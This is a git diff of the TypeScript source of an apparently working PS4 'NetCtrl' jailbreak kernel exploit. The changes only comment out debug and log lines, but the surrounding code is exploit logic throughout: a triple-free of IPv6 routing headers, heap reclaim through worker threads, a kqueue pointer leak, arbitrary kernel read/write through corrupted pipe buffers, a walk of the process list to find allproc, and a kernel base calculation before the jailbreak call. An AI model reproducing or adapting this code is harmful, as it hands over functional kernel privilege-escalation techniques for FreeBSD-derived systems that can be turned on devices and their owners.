@@ -560,7 +560,8 @@ export function netctrl_exploit () {
   }
 
   function init () {
-    // log('=== PS4 NetCtrl Jailbreak ===')
+    log('=== PS4 NetCtrl Jailbreak ===')
+    log('Begins...')
 
     if (FW_VERSION === null) {
       error('Failed to detect PS4 firmware version.\nAborting...')
@@ -579,13 +580,13 @@ export function netctrl_exploit () {
   let cleanup_called: boolean = false
 
   function setup () {
-    debug('Preparing netctrl...')
+    // log('Preparing netctrl...')
 
     prev_core = get_current_core()
     prev_rtprio = get_rtprio()
     pin_to_core(MAIN_CORE)
     set_rtprio(MAIN_RTPRIO)
-    debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE)
+    // log('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE)
 
     // Prepare spray buffer.
     spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE)
@@ -650,13 +651,13 @@ export function netctrl_exploit () {
 
     init_workers()
 
-    debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']')
+    // debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']')
   }
 
   function cleanup (kill_workers = false) {
     if (cleanup_called) return
     cleanup_called = true
-    debug('Cleaning up...')
+    // debug('Cleaning up...')
 
     // Close ipv6 sockets first (not blocking)
     for (let i = 0; i < ipv6_socks.length; i++) {
@@ -717,14 +718,14 @@ export function netctrl_exploit () {
     // }
 
     if (prev_core >= 0) {
-      debug('Restoring to previous core: ' + prev_core)
+      // debug('Restoring to previous core: ' + prev_core)
       pin_to_core(prev_core)
       prev_core = -1
     }
 
     set_rtprio(prev_rtprio)
 
-    debug('Cleanup completed')
+    // debug('Cleanup completed')
   }
 
   function fill_buffer_64 (buf: BigInt, val: BigInt, len: number) {
@@ -775,13 +776,13 @@ export function netctrl_exploit () {
         if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
           twins[0] = i
           twins[1] = j
-          log('Twins found: [' + i + '] [' + j + ']')
+          // log('Twins found: [' + i + '] [' + j + ']')
           return true
         }
       }
       count++
     }
-    log('find_twins failed')
+    // log('find_twins failed')
     return false
     // cleanup();
     // throw new Error("find_twins failed");
@@ -864,7 +865,7 @@ export function netctrl_exploit () {
 
   function exploit_phase_setup () {
     setup()
-    log('Workers spawned')
+    // log('Workers spawned')
     exploit_count = 0
     exploit_end = false
     yield_to_render(exploit_phase_trigger)
@@ -879,14 +880,14 @@ export function netctrl_exploit () {
     }
 
     exploit_count++
-    log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...')
+    // log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...')
 
     if (!trigger_ucred_triplefree()) {
       yield_to_render(exploit_phase_trigger)
       return
     }
 
-    log('Leaking kqueue...')
+    // log('Leaking kqueue...')
     yield_to_render(exploit_phase_leak)
   }
 
@@ -896,13 +897,13 @@ export function netctrl_exploit () {
       return
     }
 
-    log('Setting up arbitrary R/W...')
+    // log('Setting up arbitrary R/W...')
     yield_to_render(exploit_phase_rw)
   }
 
   function exploit_phase_rw () {
     setup_arbitrary_rw()
-    log('Jailbreaking...')
+    // log('Jailbreaking...')
     yield_to_render(exploit_phase_jailbreak)
   }
 
@@ -914,19 +915,19 @@ export function netctrl_exploit () {
     // Leak fd_files from kq_fdp.
     const fd_files = kreadslow64(kq_fdp)
     fdt_ofiles = fd_files.add(0x00)
-    debug('fdt_ofiles: ' + hex(fdt_ofiles))
+    // debug('fdt_ofiles: ' + hex(fdt_ofiles))
 
     master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE))
-    debug('master_r_pipe_file: ' + hex(master_r_pipe_file))
+    // debug('master_r_pipe_file: ' + hex(master_r_pipe_file))
 
     victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE))
-    debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file))
+    // debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file))
 
     master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00))
-    debug('master_r_pipe_data: ' + hex(master_r_pipe_data))
+    // debug('master_r_pipe_data: ' + hex(master_r_pipe_data))
 
     victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00))
-    debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data))
+    // debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data))
 
     // Corrupt pipebuf of masterRpipeFd.
     write32(master_pipe_buf.add(0x00), 0)                // cnt
@@ -949,7 +950,7 @@ export function netctrl_exploit () {
         kws_success = 1
         break
       }
-      debug('kwriteslow did not work - Trying again')
+      // debug('kwriteslow did not work - Trying again')
       ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
       if (ret_write.eq(BigInt_Error)) {
         cleanup()
@@ -977,57 +978,57 @@ export function netctrl_exploit () {
 
     for (let i = 0; i < 0x20; i = i + 8) {
       const readed = kread64(master_r_pipe_data.add(i))
-      debug('Reading master_r_pipe_data[' + i + '] : ' + hex(readed))
+      // debug('Reading master_r_pipe_data[' + i + '] : ' + hex(readed))
     }
 
-    log('Arbitrary R/W achieved')
+    // log('Arbitrary R/W achieved')
 
-    debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)))
+    // debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)))
   }
 
   function find_allproc () {
     // Use existing master_pipe instead of creating new one
     const pipe_0 = master_pipe[0]
     const pipe_1 = master_pipe[1]
-    debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1)
+    // debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1)
 
-    debug('find_allproc - Getting pid...')
+    // debug('find_allproc - Getting pid...')
     const pid = Number(getpid())
-    debug('find_allproc - pid: ' + pid)
+    // debug('find_allproc - pid: ' + pid)
 
-    debug('find_allproc - Writing pid to sockopt_val_buf...')
+    // debug('find_allproc - Writing pid to sockopt_val_buf...')
     write32(sockopt_val_buf, pid)
-    debug('find_allproc - Calling ioctl FIOSETOWN...')
+    // debug('find_allproc - Calling ioctl FIOSETOWN...')
     const ioctl_ret = ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf)
-    debug('find_allproc - ioctl returned: ' + ioctl_ret)
+    // debug('find_allproc - ioctl returned: ' + ioctl_ret)
 
-    debug('find_allproc - Getting fp...')
+    // debug('find_allproc - Getting fp...')
     const fp = fget(pipe_0)
-    debug('find_allproc - fp: ' + hex(fp))
+    // debug('find_allproc - fp: ' + hex(fp))
 
-    debug('find_allproc - Reading f_data...')
+    // debug('find_allproc - Reading f_data...')
     const f_data = kread64(fp.add(0x00))
-    debug('find_allproc - f_data: ' + hex(f_data))
+    // debug('find_allproc - f_data: ' + hex(f_data))
 
-    debug('find_allproc - Reading pipe_sigio...')
+    // debug('find_allproc - Reading pipe_sigio...')
     const pipe_sigio = kread64(f_data.add(0xd0))
-    debug('find_allproc - pipe_sigio: ' + hex(pipe_sigio))
+    // debug('find_allproc - pipe_sigio: ' + hex(pipe_sigio))
 
-    debug('find_allproc - Reading p...')
+    // debug('find_allproc - Reading p...')
     let p = kread64(pipe_sigio)
-    debug('find_allproc - initial p: ' + hex(p))
+    // debug('find_allproc - initial p: ' + hex(p))
     kernel.addr.curproc = p // Set global curproc
 
-    debug('find_allproc - Walking process list...')
+    // debug('find_allproc - Walking process list...')
     let walk_count = 0
     while (!(p.and(new BigInt(0xFFFFFFFF, 0x00000000))).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
       p = kread64(p.add(0x08)) // p_list.le_prev
       walk_count++
-      if (walk_count % 100 === 0) {
-        debug('find_allproc - walk_count: ' + walk_count + ' p: ' + hex(p))
-      }
+      // if (walk_count % 100 === 0) {
+        // debug('find_allproc - walk_count: ' + walk_count + ' p: ' + hex(p))
+      // }
     }
-    debug('find_allproc - Found allproc after ' + walk_count + ' iterations')
+    // debug('find_allproc - Found allproc after ' + walk_count + ' iterations')
 
     // Don't close - using master_pipe which we need
 
@@ -1035,7 +1036,7 @@ export function netctrl_exploit () {
   }
 
   function jailbreak () {
-    debug('jailbreak - Starting...')
+    // debug('jailbreak - Starting...')
     if (!kernel_offset) {
       throw new Error('Kernel offsets not loaded')
     }
@@ -1046,13 +1047,13 @@ export function netctrl_exploit () {
     for (let i = 0; i < 10; i++) {
       sched_yield()
     }
-    debug('jailbreak - Calling find_allproc...')
+    // debug('jailbreak - Calling find_allproc...')
     kernel.addr.allproc = find_allproc() // Set global allproc
-    debug('allproc: ' + hex(kernel.addr.allproc))
+    // debug('allproc: ' + hex(kernel.addr.allproc))
 
     // Calculate kernel base
     kernel.addr.base = kl_lock.sub((kernel_offset as { KL_LOCK: number }).KL_LOCK)
-    log('Kernel base: ' + hex(kernel.addr.base))
+    // log('Kernel base: ' + hex(kernel.addr.base))
 
     jailbreak_shared(FW_VERSION)
 
@@ -1069,7 +1070,7 @@ export function netctrl_exploit () {
 
   function fget (fd: number) {
     const f = kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE))
-    debug('Returning fget: ' + hex(f) + ' for fd: ' + fd)
+    // debug('Returning fget: ' + hex(f) + ' for fd: ' + fd)
     return f
   }
 
@@ -1084,7 +1085,7 @@ export function netctrl_exploit () {
         const in6p_outputopts = kread64(so_pcb.add(0x118))
         kwrite64(in6p_outputopts.add(0x68), new BigInt(0)) // ip6po_rhi_rthdr
       } else {
-        debug('Skipped wrong fp: ' + hex(fp) + ' for fd: ' + fd)
+        // debug('Skipped wrong fp: ' + hex(fp) + ' for fd: ' + fd)
       }
     }
   }
@@ -1107,7 +1108,7 @@ export function netctrl_exploit () {
       read(masterRpipeFd, debug_buffer, PIPEBUF_SIZE);
       for (const i=0; i<PIPEBUF_SIZE; i=i+8) {
           const readed = read64(victim_pipe_buf.add(i));
-          debug("corrupt_read: " + hex(readed) );
+          // debug("corrupt_read: " + hex(readed) );
       }
           */
 
@@ -1120,7 +1121,7 @@ export function netctrl_exploit () {
   }
 
   function kread (dest: BigInt, src: BigInt, n: number) {
-    debug('Enter kread for src: ' + hex(src))
+    // debug('Enter kread for src: ' + hex(src))
     corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src)
     // Debug
     read(new BigInt(victimRpipeFd), dest, n)
@@ -1258,7 +1259,7 @@ export function netctrl_exploit () {
         continue
       }
 
-      log('Triple freeing...')
+      // log('Triple freeing...')
 
       // Free one.
       free_rthdr(ipv6_socks[twins[1]])
@@ -1285,7 +1286,7 @@ export function netctrl_exploit () {
       }
 
       if (count === 1000) {
-        log('Dropped out from reclaim loop')
+        // log('Dropped out from reclaim loop')
         // Clean up and start again
         close(new BigInt(uaf_socket))
         continue
@@ -1301,7 +1302,7 @@ export function netctrl_exploit () {
 
       // If error start again to better exploit possibility
       if (triplets[1] === -1) {
-        log("Couldn't find triplet 1")
+        // log("Couldn't find triplet 1")
         // Clean up and start again
         // Release iov spray.
         // if we break on 'read32(leak_rthdr) == 1', we never released workers
@@ -1321,7 +1322,7 @@ export function netctrl_exploit () {
 
       // If error start again to better exploit possibility
       if (triplets[2] === -1) {
-        log("Couldn't find triplet 2")
+        // log("Couldn't find triplet 2")
         // Clean up and start again
         close(new BigInt(uaf_socket))
         // Start again
@@ -1335,7 +1336,7 @@ export function netctrl_exploit () {
     }
 
     if (main_count === TRIPLEFREE_ITERATIONS) {
-      error('Failed to Triple Free')
+      // error('Failed to Triple Free')
       return false
     }
     return true
@@ -1343,7 +1344,7 @@ export function netctrl_exploit () {
 
   function leak_kqueue () {
     // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-    debug('Leaking kqueue...')
+    // debug('Leaking kqueue...')
 
     // Free one.
     free_rthdr(ipv6_socks[triplets[1]])
@@ -1372,7 +1373,7 @@ export function netctrl_exploit () {
     }
     if (count === KQUEUE_ITERATIONS) {
       // Dropped out with no kqueue leak
-      error('Failed to leak kqueue_fdp')
+      // error('Failed to leak kqueue_fdp')
       return false
     }
 
@@ -1382,14 +1383,14 @@ export function netctrl_exploit () {
     kq_fdp = read64(leak_rthdr.add(0x98))
 
     if (kq_fdp.eq(0)) {
-      error('Failed to leak kqueue_fdp')
+      // error('Failed to leak kqueue_fdp')
       return false
     }
 
-    debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock))
+    // debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock))
 
     // for (i=0; i<0x100; i=i+8) {
-    //     debug("leak_rthdr.add(" + i + ") : " + hex(read64(leak_rthdr.add(i))));
+    //     // debug("leak_rthdr.add(" + i + ") : " + hex(read64(leak_rthdr.add(i))));
     // }
 
     // Close kqueue to free buffer.
@@ -1425,7 +1426,7 @@ export function netctrl_exploit () {
 
   function kreadslow (addr: BigInt, size: number) {
     // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-    debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size)
+    // debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size)
 
     // Memory exhaustion check
     if (debugging.info.memory.available === 0) {
@@ -1435,7 +1436,7 @@ export function netctrl_exploit () {
       return BigInt_Error
     }
 
-    debug('kreadslow - Preparing buffers...')
+    // debug('kreadslow - Preparing buffers...')
 
     // Prepare leak buffers.
     const leak_buffers = new Array(UIO_THREAD_NUM)
@@ -1453,7 +1454,7 @@ export function netctrl_exploit () {
     // Set iov length
     write64(uioIovRead.add(0x08), size)
 
-    debug('kreadslow - Freeing triplets[1]=' + triplets[1])
+    // debug('kreadslow - Freeing triplets[1]=' + triplets[1])
 
     // Free one.
     free_rthdr(ipv6_socks[triplets[1]])
@@ -1461,7 +1462,7 @@ export function netctrl_exploit () {
     // Minimize footprint
     const uio_leak_add = leak_rthdr.add(0x08)
 
-    debug('kreadslow - Starting uio reclaim loop...')
+    // debug('kreadslow - Starting uio reclaim loop...')
 
     let count = 0
     let zeroMemoryCount = 0
@@ -1480,7 +1481,7 @@ export function netctrl_exploit () {
       }
       count++
       if (count % 100 === 1) {
-        debug('kreadslow - uio loop iter ' + count)
+        // debug('kreadslow - uio loop iter ' + count)
       }
       trigger_uio_writev() // COMMAND_UIO_READ in fl0w's
       sched_yield()
@@ -1511,15 +1512,15 @@ export function netctrl_exploit () {
       return BigInt_Error
     }
 
-    debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations')
+    // debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations')
 
     const uio_iov = read64(leak_rthdr)
-    debug('kreadslow - uio_iov: ' + hex(uio_iov))
+    // debug('kreadslow - uio_iov: ' + hex(uio_iov))
 
     // Prepare uio reclaim buffer.
     build_uio(msgIov, uio_iov, 0, true, addr, size)
 
-    debug('kreadslow - Freeing triplets[2]=' + triplets[2])
+    // debug('kreadslow - Freeing triplets[2]=' + triplets[2])
 
     // Free second one.
     free_rthdr(ipv6_socks[triplets[2]])
@@ -1527,7 +1528,7 @@ export function netctrl_exploit () {
     // Minimize footprint
     const iov_leak_add = leak_rthdr.add(0x20)
 
-    debug('kreadslow - Starting iov reclaim loop...')
+    // debug('kreadslow - Starting iov reclaim loop...')
 
     // Reclaim uio with iov.
     let zeroMemoryCount2 = 0
@@ -1553,7 +1554,7 @@ export function netctrl_exploit () {
       get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)
 
       if (read32(iov_leak_add) === UIO_SYSSPACE) {
-        debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations')
+        // debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations')
         break
       }
 
@@ -1563,7 +1564,7 @@ export function netctrl_exploit () {
       read(new BigInt(iov_sock_0), tmp, 1)
     }
 
-    debug('kreadslow - Reading leak buffers...')
+    // debug('kreadslow - Reading leak buffers...')
 
     // Wake up all threads.
     read(new BigInt(uio_sock_0), tmp, size)
@@ -1576,12 +1577,12 @@ export function netctrl_exploit () {
     for (let i = 0; i < UIO_THREAD_NUM; i++) {
       read(new BigInt(uio_sock_0), leak_buffers[i], size)
       const val = read64(leak_buffers[i])
-      debug('kreadslow - leak_buffers[' + i + ']: ' + hex(val))
+      // debug('kreadslow - leak_buffers[' + i + ']: ' + hex(val))
       if (!val.eq(tag_val)) {
-        debug('kreadslow - Found valid leak at index ' + i + ', finding triplets[1]...')
+        // debug('kreadslow - Found valid leak at index ' + i + ', finding triplets[1]...')
         // Find triplet.
         triplets[1] = find_triplet(triplets[0], -1)
-        debug('kreadslow - triplets[1]=' + triplets[1])
+        // debug('kreadslow - triplets[1]=' + triplets[1])
         leak_buffer = leak_buffers[i].add(0)
       }
     }
@@ -1600,16 +1601,16 @@ export function netctrl_exploit () {
       return BigInt_Error
     }
 
-    debug('kreadslow - Finding triplets[2]...')
+    // debug('kreadslow - Finding triplets[2]...')
 
     // Find triplet[2].
     for (let retry = 0; retry < 3; retry++) {
       triplets[2] = find_triplet(triplets[0], triplets[1])
       if (triplets[2] !== -1) break
-      debug('kreadslow - triplets[2] retry ' + (retry + 1))
+      // debug('kreadslow - triplets[2] retry ' + (retry + 1))
       sched_yield()
     }
-    debug('kreadslow - triplets[2]=' + triplets[2])
+    // debug('kreadslow - triplets[2]=' + triplets[2])
 
     if (triplets[2] === -1) {
       error('kreadslow - Failed to find triplets[2]. Reboot and try again.')
@@ -1634,14 +1635,14 @@ export function netctrl_exploit () {
     wait_iov_recvmsg()
     read(new BigInt(iov_sock_0), tmp, 1)
 
-    debug('kreadslow - Done, returning leak_buffer: ' + hex(leak_buffer))
+    // debug('kreadslow - Done, returning leak_buffer: ' + hex(leak_buffer))
 
     return leak_buffer
   }
 
   function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
     // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-    debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size)
+    // debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size)
 
     // Set send buf size.
     write32(sockopt_val_buf, size)
@@ -2200,7 +2201,7 @@ export function netctrl_exploit () {
     return false
   }
 
-  log('Setting up exploit...')
+  // log('Setting up exploit...')
   yield_to_render(exploit_phase_setup)
 }
 
